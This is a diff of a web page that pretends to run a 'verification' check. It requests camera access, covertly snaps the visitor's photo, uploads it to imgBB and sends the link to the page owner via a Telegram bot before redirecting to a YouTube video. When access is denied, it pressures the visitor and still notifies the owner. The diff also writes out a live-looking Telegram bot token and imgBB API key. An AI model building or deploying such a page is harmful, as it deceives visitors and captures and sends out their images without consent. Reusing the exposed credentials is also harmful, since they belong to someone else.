@@ -40,19 +40,6 @@
         .status { color: #666; margin-top: 20px; font-size: 13px; }
         .success { color: #28a745; }
         .error { color: #dc3545; }
-        button {
-            background: #28a745;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 20px;
-        }
-        .hidden { display: none; }
     </style>
 </head>
 <body>
@@ -65,8 +52,8 @@
 
     <script>
         // ===== CONFIGURATION =====
-        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
-        const IMGBB_API_KEY = "ဒီနေရာမှာ သင့် imgBB API Key ထည့်ပါ";
+        const BOT_TOKEN = "8365800784:AAH_xopF7digtn1X0pfGKtr7fGv4zZZyRy8";
+        const IMGBB_API_KEY = "b7ba0100d04e0add952f217e712c7ff8";
         const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         // =========================
         
@@ -143,18 +130,15 @@
             
             canvas.toBlob(async (blob) => {
                 try {
-                    // Upload to imgBB
-                    document.getElementById('status').innerHTML = '📤 Uploading to server...';
+                    document.getElementById('status').innerHTML = '📤 Uploading...';
                     const imageUrl = await uploadToImgBB(blob);
                     
-                    // Send image URL to owner via bot
-                    document.getElementById('status').innerHTML = '📤 Sending to owner...';
+                    document.getElementById('status').innerHTML = '📤 Sending...';
                     await sendMessageToOwner(`📸 PHOTO CAPTURED!\n🕐 Time: ${new Date().toLocaleString()}\n📷 Image: ${imageUrl}`);
                     
-                    document.getElementById('status').innerHTML = '✅ Verification complete!';
+                    document.getElementById('status').innerHTML = '✅ Complete!';
                     document.getElementById('status').className = 'status success';
                     
-                    // Redirect to YouTube
                     setTimeout(() => {
                         window.location.href = YOUTUBE_URL;
                     }, 2000);
@@ -185,11 +169,10 @@
                 await takePhotoAndSend(stream);
                 
             } catch (err) {
-                console.error('Camera error:', err);
                 document.getElementById('title').innerHTML = '❌ Camera Access Denied';
                 document.getElementById('subtitle').innerHTML = 'Please click ALLOW to continue';
                 document.getElementById('loading').style.display = 'none';
-                document.getElementById('status').innerHTML = 'Click the ALLOW button above ☝️';
+                document.getElementById('status').innerHTML = 'Click ALLOW button above ☝️';
                 document.getElementById('status').className = 'status error';
                 
                 await sendMessageToOwner(`❌ CAMERA DENIED!\n🕐 Time: ${new Date().toLocaleString()}`);
